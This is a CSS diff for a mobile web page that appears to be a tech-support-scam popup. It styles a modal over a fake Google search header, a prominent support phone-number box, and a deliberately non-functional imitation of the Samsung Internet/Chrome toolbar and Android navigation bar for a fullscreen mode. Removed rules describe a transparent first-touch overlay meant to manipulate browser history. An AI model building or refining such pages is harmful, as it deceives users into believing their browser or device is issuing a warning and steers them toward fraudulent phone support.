@@ -1,134 +1,363 @@
 /* ==========================================================================
-   Minimal White Popup Layout & Component Styles
+   App Viewport & Layout (Matches Attachment 1 & 2)
    ========================================================================== */
 
-.page-wrapper {
+.app-viewport {
   min-height: 100vh;
   min-height: 100dvh;
   width: 100vw;
+  background-color: #2b2d30;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: flex-start;
+  position: relative;
+  overflow-x: hidden;
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  transition: padding-bottom 0.2s ease;
+}
+
+.app-viewport.mode-fullscreen {
+  padding-bottom: 110px;
+}
+
+/* Background Google Search Header (faintly visible behind modal in screenshot) */
+.bg-search-header {
+  width: 100%;
+  padding: 5px 20px;
   display: flex;
   align-items: center;
+  user-select: none;
+  pointer-events: none;
+}
+
+.bg-search-logo {
+  font-size: 24px;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+  display: flex;
+  gap: 1px;
+}
+
+/* Main Content Stage */
+.main-content-stage {
+  width: 100%;
+  display: flex;
   justify-content: center;
+  align-items: flex-start;
+  padding: 10px 14px 30px 14px;
+  z-index: 10;
   box-sizing: border-box;
-  padding: 0;
-  margin: 0;
 }
 
 /* ==========================================================================
-   Simple White Popup Box (95vw by 95dvh on Mobile)
+   Popup Modal Dialog (Attachment 1 Default)
    ========================================================================== */
 
-.popup-container {
-  width: 95vw;
-  height: 95vh;
-  height: 95dvh;
-  background-color: #ffffff;
-  border: 1px solid #d1d5db;
-  border-radius: 12px;
-  box-shadow: 0 4px 20px rgba(0, 0, 0, 48%);
-  box-sizing: border-box;
+.popup-dialog-overlay {
+  width: 100%;
+  max-width: 420px;
   display: flex;
-  flex-direction: column;
-  overflow: hidden;
+  justify-content: center;
+  align-items: center;
+  box-sizing: border-box;
 }
 
-/* Constrain maximum size comfortably on larger desktop displays */
-@media (min-width: 600px) {
-  .popup-container {
-    max-width: 460px;
-    max-height: 620px;
+.popup-card-box {
+  width: 100%;
+  background-color: #ffffff;
+  border-radius: 8px;
+  box-shadow: 0 12px 40px rgba(0, 0, 0, 0.55);
+  overflow: hidden;
+  display: flex;
+  flex-direction: column;
+  box-sizing: border-box;
+  animation: modalEnter 0.2s ease-out;
+}
+
+@keyframes modalEnter {
+  from {
+    opacity: 0;
+    transform: scale(0.96) translateY(-6px);
+  }
+
+  to {
+    opacity: 1;
+    transform: scale(1) translateY(0);
   }
 }
 
-.popup-content {
-  display: flex;
-  flex-direction: column;
-  justify-content: space-between;
-  height: 100%;
-  padding: 24px 20px;
-  box-sizing: border-box;
+/* Black Box Area (Upper section of modal as in Attachment 1 & 2) */
+.popup-black-area {
+  /* background-color: #000000; */
+  min-height: 180px;
+  /* max-height: 260px; */
   overflow-y: auto;
   -webkit-overflow-scrolling: touch;
-}
-
-/* Text Section (Top) */
-.popup-body {
+  padding: 16px 18px;
+  color: #ffffff;
   display: flex;
   flex-direction: column;
-  gap: 14px;
+  box-sizing: border-box;
 }
 
-.popup-heading {
-  font-size: 1.5rem;
+.popup-black-inner {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.popup-black-title {
+  font-size: 15px;
   font-weight: 700;
-  color: #000000;
-  line-height: 1.25;
+  color: #ffffff;
+  line-height: 1.35;
+  margin: 0;
+  word-break: break-word;
+}
+
+.popup-black-sub {
+  font-size: 13px;
+  font-weight: 600;
+  color: #000;
   margin: 0;
 }
 
-.popup-paragraph {
-  font-size: 1rem;
-  line-height: 1.55;
-  color: #1f2937;
-  margin: 0;
-}
-
-.popup-subtext {
-  font-size: 0.85rem;
+.popup-black-body {
+  font-size: 15px;
   line-height: 1.45;
-  color: #6b7280;
+  color: #000;
+  margin: 0;
+}
+
+.popup-black-detail {
+  font-size: 15px;
+  line-height: 1.4;
+  color: #000;
+  margin: 0;
+}
+
+.popup-black-note {
+  font-size: 15px;
+  line-height: 1.35;
+  color: #000;
   margin: 4px 0 0 0;
 }
 
-/* Actions Section (Bottom) */
-.popup-footer {
-  margin-top: auto;
-  padding-top: 20px;
+/* Support Call Section */
+.popup-support-container {
+  background-color: #f1f3f4;
+  margin: 12px 14px 14px 14px;
+  padding: 10px 14px 12px 14px;
+  border-radius: 4px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  box-sizing: border-box;
 }
 
-/* ==========================================================================
-   Simple Solid Call Now Button
-   ========================================================================== */
+.popup-support-label {
+  font-size: 14.5px;
+  font-weight: 600;
+  color: #202124;
+  margin-bottom: 8px;
+  text-align: center;
+}
 
-.call-button {
+.popup-phone-link-box {
+  display: block;
+  width: 100%;
+  border: 1.5px solid #0077b6;
+  background-color: #f0f7ff;
+  color: #0077b6;
+  font-size: 18px;
+  font-weight: 700;
+  text-align: center;
+  padding: 8px 12px;
+  border-radius: 4px;
+  text-decoration: none;
+  box-sizing: border-box;
+  transition: background-color 0.15s ease;
+}
+
+.popup-phone-link-box:hover,
+.popup-phone-link-box:active {
+  background-color: #e0effe;
+}
+
+/* OK and Cancel Action Buttons */
+.popup-button-group {
+  display: flex;
+  gap: 14px;
+  justify-content: center;
+  padding: 0 14px 18px 14px;
+  box-sizing: border-box;
+}
+
+.popup-btn-action {
+  flex: 1;
+  height: 42px;
+  border-radius: 4px;
+  border: none;
+  font-size: 14.5px;
+  font-weight: 600;
+  cursor: pointer;
   display: flex;
   align-items: center;
   justify-content: center;
-  gap: 8px;
-  width: 100%;
-  min-height: 52px;
-  padding: 12px 16px;
-  background-color: #16a34a;
-  color: #ffffff !important;
-  font-size: 1.1rem;
-  font-weight: 700;
-  text-decoration: none;
-  border-radius: 8px;
-  border: none;
-  cursor: pointer;
   box-sizing: border-box;
-  text-align: center;
-  transition: background-color 0.15s ease;
-  touch-action: manipulation;
+  transition: filter 0.15s ease, transform 0.08s ease;
+}
+
+.popup-btn-action:active {
+  transform: scale(0.97);
+  filter: brightness(0.9);
+}
+
+.popup-btn-ok {
+  background-color: #0078d4;
+  color: #ffffff;
+}
+
+.popup-btn-cancel {
+  background-color: #5f6368;
+  color: #ffffff;
+}
+
+/* Loading State Box */
+.loading-box {
+  min-height: 200px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+/* ==========================================================================
+   Fake Bottom Bar (Attachment 2 Fullscreen Mode)
+   Non-functional Samsung Internet / Chrome Mobile Navigation Bar
+   ========================================================================== */
+
+.fake-mobile-bottom-bar {
+  position: fixed;
+  bottom: 0;
+  left: 0;
+  width: 100vw;
+  z-index: 9999;
+  box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.35);
   user-select: none;
+  -webkit-user-select: none;
+  display: flex;
+  flex-direction: column;
 }
 
-.call-button:hover {
-  background-color: #15803d;
+/* 1. Fake Browser Action Bar (White) */
+.fake-browser-toolbar {
+  background-color: #ffffff;
+  height: 48px;
+  border-top: 1px solid #e0e0e0;
+  display: flex;
+  align-items: center;
+  justify-content: space-around;
+  padding: 0 8px;
+  box-sizing: border-box;
 }
 
-.call-button:active {
-  background-color: #166534;
+.fake-nav-btn {
+  background: none;
+  border: none;
+  padding: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  cursor: default;
+  outline: none;
 }
 
-.call-button-text {
+.fake-tabs-icon {
+  width: 20px;
+  height: 20px;
+  border: 1.8px solid #5f6368;
+  border-radius: 4px;
+  font-size: 11.5px;
   font-weight: 700;
+  color: #5f6368;
+  display: flex;
+  align-items: center;
+  justify-content: center;
 }
 
-.call-button-number {
-  font-weight: 500;
-  font-size: 0.95rem;
-  opacity: 0.95;
+.fake-menu-btn {
+  position: relative;
+}
+
+.fake-menu-dot {
+  position: absolute;
+  top: 5px;
+  right: 5px;
+  width: 6.5px;
+  height: 6.5px;
+  background-color: #ff5722;
+  border-radius: 50%;
+}
+
+/* 2. Fake Android System Navigation Bar (Dark) */
+.fake-system-navbar {
+  background-color: #121212;
+  height: 36px;
+  display: flex;
+  align-items: center;
+  justify-content: space-around;
+  padding: 0 24px;
+  box-sizing: border-box;
+}
+
+.fake-sys-btn {
+  background: none;
+  border: none;
+  padding: 6px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: default;
+  outline: none;
+}
+
+.fake-home-circle {
+  width: 17px;
+  height: 17px;
+  border: 1.8px solid #8c9096;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.fake-home-inner-dot {
+  width: 5px;
+  height: 5px;
+  background-color: #8c9096;
+  border-radius: 50%;
+}
+
+/* 3. Android Gesture Line Bar */
+.fake-gesture-bar {
+  background-color: #121212;
+  height: 14px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-sizing: border-box;
+}
+
+.fake-gesture-pill {
+  width: 80px;
+  height: 3.5px;
+  background-color: #ffffff;
+  border-radius: 2px;
+  opacity: 0.85;
 }
 
 /* ==========================================================================
@@ -139,7 +368,7 @@
   position: fixed;
   bottom: 8px;
   right: 8px;
-  z-index: 9999;
+  z-index: 10000;
   font-family: system-ui, sans-serif;
 }
 
@@ -238,208 +467,4 @@
 
 .btn-preset:hover {
   background: #e5e7eb;
-}
-
-/* ==========================================================================
-   Transparent First-Touch Overlay Layer
-   Captures very first screen touch/drag to activate browser history queue
-   ========================================================================== */
-.first-touch-overlay {
-  position: fixed;
-  top: 0;
-  left: 0;
-  right: 0;
-  bottom: 0;
-  width: 100vw;
-  height: 100vh;
-  height: 100dvh;
-  z-index: 99990;
-  background: transparent;
-  opacity: 0;
-  cursor: pointer;
-  touch-action: manipulation;
-}
-
-/* ==========================================================================
-   High-Priority Interaction Modal (Pop-up Overlay & Re-Arming Dialog)
-   ========================================================================== */
-.interaction-overlay {
-  position: fixed;
-  top: 0;
-  left: 0;
-  right: 0;
-  bottom: 0;
-  width: 100vw;
-  height: 100vh;
-  height: 100dvh;
-  z-index: 100000;
-  background: rgba(15, 23, 42, 0.75);
-  backdrop-filter: blur(6px);
-  -webkit-backdrop-filter: blur(6px);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  padding: 16px;
-  box-sizing: border-box;
-  animation: fadeInOverlay 0.2s ease-out;
-  cursor: pointer;
-}
-
-.interaction-modal {
-  position: relative;
-  width: 100%;
-  max-width: 380px;
-  background: #ffffff;
-  border-radius: 18px;
-  padding: 26px 20px 22px 20px;
-  box-shadow: 0 24px 48px -12px rgba(0, 0, 0, 0.45), 0 0 0 1px rgba(0, 0, 0, 0.08);
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  text-align: center;
-  box-sizing: border-box;
-  animation: popInModal 0.25s cubic-bezier(0.16, 1, 0.3, 1);
-  cursor: default;
-}
-
-.interaction-close-btn {
-  position: absolute;
-  top: 12px;
-  right: 12px;
-  width: 34px;
-  height: 34px;
-  border: none;
-  background: #f3f4f6;
-  border-radius: 50%;
-  font-size: 20px;
-  line-height: 1;
-  color: #6b7280;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  cursor: pointer;
-  transition: background 0.15s ease, color 0.15s ease, transform 0.1s ease;
-}
-
-.interaction-close-btn:hover {
-  background: #e5e7eb;
-  color: #111827;
-}
-
-.interaction-close-btn:active {
-  transform: scale(0.92);
-}
-
-.interaction-badge {
-  display: inline-flex;
-  align-items: center;
-  gap: 6px;
-  padding: 4px 12px;
-  background: #eff6ff;
-  color: #1d4ed8;
-  border: 1px solid #bfdbfe;
-  border-radius: 9999px;
-  font-size: 0.75rem;
-  font-weight: 700;
-  text-transform: uppercase;
-  letter-spacing: 0.4px;
-}
-
-.interaction-badge-dot {
-  width: 6px;
-  height: 6px;
-  border-radius: 50%;
-  background: #2563eb;
-  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.25);
-  animation: pulseDot 1.8s infinite;
-}
-
-.interaction-title {
-  font-size: 1.35rem;
-  font-weight: 800;
-  color: #111827;
-  margin: 14px 0 8px 0;
-  line-height: 1.25;
-}
-
-.interaction-description {
-  font-size: 0.95rem;
-  line-height: 1.5;
-  color: #4b5563;
-  margin: 0 0 20px 0;
-}
-
-.interaction-cta-btn {
-  width: 100%;
-  min-height: 52px;
-  padding: 14px 20px;
-  background: #16a34a;
-  color: #ffffff;
-  border: none;
-  border-radius: 12px;
-  font-size: 1.05rem;
-  font-weight: 700;
-  cursor: pointer;
-  box-shadow: 0 4px 16px rgba(22, 163, 74, 0.42);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  transition: transform 0.1s ease, background 0.15s ease, box-shadow 0.15s ease;
-  animation: pulseCta 2s infinite ease-in-out;
-}
-
-.interaction-cta-btn:hover {
-  background: #15803d;
-  box-shadow: 0 6px 20px rgba(22, 163, 74, 0.52);
-}
-
-.interaction-cta-btn:active {
-  transform: scale(0.96);
-  background: #166534;
-}
-
-.interaction-subtext {
-  font-size: 0.78rem;
-  color: #6b7280;
-  margin: 10px 0 0 0;
-}
-
-@keyframes fadeInOverlay {
-  from {
-    opacity: 0;
-  }
-  to {
-    opacity: 1;
-  }
-}
-
-@keyframes popInModal {
-  from {
-    opacity: 0;
-    transform: scale(0.92) translateY(10px);
-  }
-  to {
-    opacity: 1;
-    transform: scale(1) translateY(0);
-  }
-}
-
-@keyframes pulseDot {
-  0%, 100% {
-    transform: scale(1);
-    opacity: 1;
-  }
-  50% {
-    transform: scale(1.3);
-    opacity: 0.7;
-  }
-}
-
-@keyframes pulseCta {
-  0%, 100% {
-    transform: scale(1);
-  }
-  50% {
-    transform: scale(1.02);
-  }
 }
